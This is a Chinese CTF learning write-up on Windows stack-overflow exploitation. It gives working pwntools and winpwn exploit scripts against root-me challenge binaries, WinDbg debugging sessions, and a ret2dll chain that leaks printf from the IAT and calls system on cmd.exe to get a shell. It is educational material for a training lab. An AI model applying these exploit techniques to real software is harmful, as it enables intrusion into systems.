win-pwn初探（二）

[![img](https://xz.aliyun.com/assets/pc/images/pic_default_secret.png) z1r0 发表于 江苏](https://xz.aliyun.com/users/122872) [技术文章](https://xz.aliyun.com/news?cate_id=9) 7845浏览 · 2022-11-26 19:33

> 上一节笔者学习了winpwn的用法，以及最基础的栈溢出利用用法和win pwn的保护机制的意思，这一节笔者学习了利用pwntools编写exp以及调试程序，也学习了ret2dll的利用手法

之前的文章链接：

- [win pwn初探（一）](https://xz.aliyun.com/t/11865)

# win-pwn初探（二）

## 利用pwntools编写exp

这里需要Ex师傅的一个工具：[Win Server](https://github.com/Ex-Origin/win_server)，这个就像搭建pwn题一样，把exe给映射到一个端口上

```
git clone https://github.com/Ex-Origin/win_server.git
```

如上git clone之后即可使用，用法：`.\win_server.exe ..\ch72\ch72.exe 1234`就可以把ch72.exe给映射到1234端口上，试着用nc连接一下，发现可以正常的执行程序

```
16:15:45 z1r0@z1r0deMacBook-Pro.local test nc 10.211.55.3 1234
a
A
```

pwntools如下安装

```
pip3 install pwntools
```

接着就可以正常使用pwntools了，需要注意的是目前只支持`remote`的用法

```
from pwn import *
from time import sleep

context.log_level = 'debug'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

r = remote('10.211.55.3', 1234)

p1 = b'a' * (0x14 + 4)
p1 += p32(0x401000)
r.sendline(p1)
sleep(1)
r.sendline('calc')

r.interactive()
```

将上一节的exp改一下之后运行可以正常触发calc

## 结合pwntools进行调试

在调试exp的时候花了很长时间，断点下在了main函数入口那里，以为会直接断在那里的。然后运行的时候发现断不了，就在网上找解决方法（srv，reload），心态快要爆炸后，问了一下Ex师傅，师傅看了一眼就知道问题出在了断点下的太前，已经执行过了，在gets后下了一个断点就成功的断下来了

首先在exp前面加上一个pause()使得程序停住，如下exp运行

```
from pwn import *
from time import sleep

context.log_level = 'debug'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

r = remote('10.211.55.3', 1234)

pause()
p1 = b'a' * (0x14 + 4)
p1 += p32(0x401000)
r.sendline(p1)

r.interactive()
```

然后利用windbg attach到程序上

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221126193123-db0b98ba-6d7d-1.png)

在`0x0401088`这里下一个断点，并且输入g，g就是程序运行到断点停住

```
0:002> bp 0x0401088
0:002> g
```

然后回到exp那里输入任意键，执行payload，此时windbg会断到断点这里

```
0:002> g
Breakpoint 0 hit
eax=00000012 ebx=00243000 ecx=00402732 edx=0041b098 esi=0041be28 edi=0041be2c
eip=00401088 esp=0019fe74 ebp=0019fe90 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0023             efl=00000202
ch72+0x1088:
00401088 83c408          add     esp,8
```

在ebp这里减去0x20就可以看到输入了a（0x61）被转换成大写A（0x41），并且后面可以看到ebp被覆盖成了aaaa而返回地址被覆盖成了`0x00401000`这个地址也就是后门地址

```
0:000> dc ebp - 0x20
0019fe70  00401088 0041b01c 0019fe7c 41414141  ..@...A.|...AAAA
0019fe80  41414141 41414141 41414141 00000010  AAAAAAAAAAAA....
0019fe90  61616161 00401000 00000000 06e29668  aaaa..@.....h...
0019fea0  06e29690 8abb39fd 00401347 00243000  .....9..G.@..0$.
0019feb0  00243000 00000000 00401347 00243000  .0$.....G.@..0$.
0019fec0  0019fea4 00000000 0019fef8 00401c60  ............`.@.
0019fed0  8ae3509d 00000000 0019fef0 762ec038  .P..........8..v
0019fee0  00243000 00000000 00000000 00000000  .0$.............
```

再次g就可以getshell，也可以单步调试-`p`，下面是ret之后的，可以看到成功跑进后门里

```
0:000> p
eax=00000000 ebx=00363000 ecx=00402732 edx=0041b098 esi=0041be28 edi=0041be2c
eip=00401000 esp=0019fe98 ebp=61616161 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0023             efl=00000246
ch72+0x1000:
00401000 55              push    ebp
```

## 利用winpwn模块进行调试

winpwn调试和上面的区别是winpwn可以本地调试（对目前来说），在winpwn的官方文档里要求配置一个.winpwn到**HOMEDIR**这个文件夹里面，不知道homedir是什么就可以用如下python运行一下

```
Python 3.10.8 (tags/v3.10.8:aaaf517, Oct 11 2022, 16:50:30) [MSC v.1933 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.path.expanduser("~\\.winpwn")
'C:\\Users\\MAC\\.winpwn'
>>>
```

然后写入如下配置

```
{
    "debugger":{
        "i386": {
            "x64dbg": "F:\\ctfTools\\debugTools\\x64debug\\release\\x32\\x32dbg.exe", 
            "gdb": "F:\\ctfTools\\windows-gdb\\mingw-w64-686\\mingw32\\bin\\gdb.exe", 
            "windbg": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe",
            "windbgx": "C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe"
        },
        "amd64": {
            "x64dbg": "F:\\ctfTools\\debugTools\\x64debug\\release\\x64\\x64dbg.exe", 
            "gdb": "F:\\ctfTools\\windows-gdb\\mingw-w64-64\\mingw64\\bin\\gdb64.exe", 
            "windbg": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe",
            "windbgx": "C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe"
        }
    },
    "debugger_init": {
        "i386": {
            "x64dbg": "", 
            "gdb": "", 
            "windbg": ".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;",
            "windbgx": ".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"
        },
        "amd64": {
            "x64dbg": "", 
            "gdb": "", 
            "windbg": ".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;",
            "windbgx": ".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"
        }
    }
}
```

目前只需要改第7行的代码，把之前下载的windbg.exe的位置填进去就好了

然后exp如下

```
from winpwn import *
from time import *

#context.log_level='debug'
context.arch='i386'

file_name = './ch72.exe'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

r = process(file_name)

windbgx.attach(r)
payload  = 'a' * (0x14 + 4)
payload += p32(0x401000)
r.sendline(payload)

r.interactive()
```

运行exp时windbg就会自动启动，再像上面pwntools那样下断点即可

## ret2dll

这个攻击手法和ret2libc相似，用`root-me PE32 - Stack buffer overflow avancé`这题来学习一下

[题目地址](https://www.root-me.org/fr/Challenges/App-Systeme/PE32-Stack-buffer-overflow-avance)，题目源码需要攻击成功之后才可以查看

在做这个题目前先理解一下什么是dll，DLL的全称是Dynamic Link Library，中文叫做“动态链接文件”，在Windows操作系统中，DLL对于程序执行是非常重要的，因为程序在执行的时候，必须链接到DLL文件，才能够正确地运行。而有些DLL文件可以被许多程序共用。因此, 程序设计人员可以利用DLL文件, 使程序不至于太过巨大。

这测试一下，写一个test.c

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv) {
    printf("hello wrold");
    system("pause");
    return 0;
}
```

接着用[进程资源管理器](https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer)这个工具查看test.exe的dll有哪些

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221126193143-e6f7964c-6d7d-1.png)

看到了几个经常看见的dll，`ntdll.dll`, `kernel32.dll`, `KernelBase.dll`, `ucrtbase.dll`

- ntdll.dll：ntdll.dll是重要的Windows NT内核级文件。描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。是Windows系统从ring3到ring0的入口，位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中
- kernel32.dll：kernel32.dll是非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域
- KernelBase.dll：系统文件kernelbase.dll是存放在Windows系统文件夹中的重要文件，通常情况下是在安装操作系统过程中自动创建的，对于系统正常运行来说至关重要
- ucrtbase.dll：在介绍ucrtbase.dll前先看一下msvcrt.dll是啥，msvcrt.dll是微软在windows操作系统中提供的C语言运行库执行文件（Microsoft Visual C Runtime Library)，其中提供了printf,malloc,strcpy等C语言库函数的具体运行实现，这个和libc.so很像。ucrtbase.dll其实就是把`msvcrt.dll`拆开了，主要的c运行时的代码放在了`ucrtbase.dll`中

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221126193203-f35a0c12-6d7d-1.png)

整个调用链如上

现在回到题目，ida反汇编之后如下

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v4; // [esp+1Ch] [ebp-4h]

  __main();
  if ( argc <= 1 )
  {
    fprintf(&__iob[2], "Usage: %s <filename>\n", *argv);
    exit(1);
  }
  v4 = fopen(argv[1], "r");
  manage_file(v4, (char *)argv[1]);
  return 0;
}
```

会把argv转入的filename通过fopen打开，传入到`manage_file`函数中，跟进

```
int __usercall manage_file@<eax>(int a1@<eax>, FILE *Stream, char *FileName)
{
  void *v3; // esp
  int v4; // eax
  int v5; // eax
  int v6; // eax
  char DstBuf[8192]; // [esp+14h] [ebp-a] BYREF
  int FileHandle; // [esp+2014h] [ebp-14h]
  unsigned int MaxCharCount; // [esp+2018h] [ebp-10h]
  FILE *v11; // [esp+201Ch] [ebp-Ch]

  v3 = alloca(a1);
  memset(DstBuf, 0, sizeof(DstBuf));
  v11 = Stream;
  printf("File name: %s\n", FileName);
  fseek(Stream, 0, 2);
  MaxCharCount = ftell(Stream);
  rewind(Stream);
  printf("File size: %d\n", MaxCharCount);
  FileHandle = open(FileName, 0);
  read(FileHandle, DstBuf, MaxCharCount);
  close(FileHandle);
  v4 = count_chars(DstBuf);
  printf("Alphanumerical chars: %d\n", v4);
  v5 = count_words(DstBuf);
  printf("Words: %d\n", v5);
  v6 = count_lines(DstBuf);
  printf("Lines: %d\n", v6);
  printf("File pointer: %p\n", v11);
  return fclose(v11);
}
```

首先会输出文件名，接着会把文件大小给输出，然后打开文件通过read将文件里面的内容输入到`DstBuf`这个变量中，值得注意的是并没有对大小进行限制，导致栈溢出的发生，但是还有一个点是需要注意的，fclose(v11)这个v11直接栈溢出的话会被覆盖掉最后会导致失败，所以需要把v11先给泄露出来然后栈溢出的时候把v11还给覆盖成正常的pointer即可

所以先随便写一个文件然后运行一下输出一下`File pointer`

```
PS ch73> echo a > p1
PS ch73> .\ch73.exe p1
File name: p1
File size: 8
Alphanumerical chars: 1
Words: 1
Lines: 0
File pointer: 75E2D660
```

拿到`pointer`之后就可以构造第二个payload了，因为这个程序没有system函数，但是我们需要getshell所以不得不寻找system，在glibc pwn中，可以使用ret2libc的攻击手法，在win中通过上面的介绍`msvcrt.dll`里提供了具体的实现，所以也是有ret2dll的攻击方法，原理和ret2libc差不多

在win中并没有plt和got表这个概念，但是DLL也用到了类似GOT的方法，称为**导入地址数组**（**Import Address Table，IAT**），IAT和GOT非常类似，IAT中表项对应本模块中用到的外部符号的真实地址，初始为空（也不算为空），在装载后由动态链接器更新为真实地址。在ida中可以看到位于.idata段中

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221126193221-fdd106b4-6d7d-1.png)

plt其实可以看成下图的地址

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221126193235-05fcd91c-6d7e-1.png)

接下来构造第二个payload，也就是输出printf的真实地址，exp如下

```
from winpwn import *

context.log_level = 'debug'

printf_plt = 0x402974
printf_got = 0x406200

p1 = p32(0x75E2D660) * 2053
p1 += p32(0xdeadbeef)
p1 += p32(printf_plt)
p1 += p32(0x004016E3)
p1 += p32(printf_got)

p1 = [ord(i) for i in p1]

with open('./p2', 'wb+') as f:
    f.write(bytes(p1))

f.close()
```

运行之后最后那一串就是printf的真实地址，因为是argv这种参数，所以接收地址不是很好接收，winpwn自动化没有输出（很奇怪），所以笔者就用动态调试exp来获得printf的真实地址，这里笔者用的ida调试的

```
PS ch73> .\ch73.exe p2
File name: p2
File size: 8228
Alphanumerical chars: 2054
Words: 1
Lines: 0
File pointer: 75E2D660
pV觰PW觰癢觰 Y觰PY觰€[觰File name: 兡[?垭壝岰?卲*@
```

在`401825`这里下个断点然后，在debug里面选择本地，找到程序后Parameters里面放入p2也就是argv，然后开始调试

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221126193249-0ebc0dac-6d7e-1.png)

到断点那里，然后g搜索到`406200`这个地址，这个里面就存放的是printf的真实地址

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221126193302-1666dffa-6d7e-1.png)

拿到printf真实的地址之后就需要算dll的base，在笔者的虚拟机里`msvcrt.dll`是在`C:\Windows\SyChpe32\msvcrt.dll`但是笔者在实机上测的时候这个程序的dll在 `C:\WINDOWS\SysWOW64\msvcrt.dll`这里

把dll文件拖到ida中，搜索printf在dll里面的偏移算出dll_base，还有system以及cmd.exe的偏移并算出真实地址

```
printf_addr = 0x75D35670

dll_base = printf_addr - 0x10105670
system_addr = dll_base + 0x10105A70

cmd_addr = dll_base + 0x1010D158
```

最后再构造getshell的payload如下

```
p1 = p32(0x75E2D660) * 2053
p1 += p32(0xdeadbeef)
p1 += p32(system_addr)
p1 += p32(0x004016E3)
p1 += p32(cmd_addr)

p1 = [ord(i) for i in p1]

with open('./p3', 'wb+') as f:
    f.write(bytes(p1))

f.close()
```

运行即可getshell

```
PS ch73> .\ch73.exe p3
File name: p3
File size: 8228
Alphanumerical chars: 2056
Words: 1
Lines: 0
File pointer: 75E2D660
Microsoft Windows [版本 10.0.22000.1219]
(c) Microsoft Corporation。保留所有权利。
```

## 总结

这里笔者学习了IAT表和作用，还有argv参数的调试，坑点是`msvcrt.dll`这个文件位置需要根着自己本机的程序来确定，笔者卡在这里一段时间，最后想了一下把程序在ida中调试了一下才发现`msvcrt.dll`的位置和网上的wp有些不一样

## Reference

https://zhuanlan.zhihu.com/p/406236763

https://baike.baidu.com/item/ntdll.dll/10959419

https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/

[https://www.polarxiong.com/archives/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3DLL%E4%B8%8D%E6%98%AF%E5%9C%B0%E5%9D%80%E6%97%A0%E5%85%B3%E7%9A%84-DLL%E4%B8%8EELF%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90.html](https://www.polarxiong.com/archives/如何理解DLL不是地址无关的-DLL与ELF的对比分析.html)

https://www.anquanke.com/post/id/210394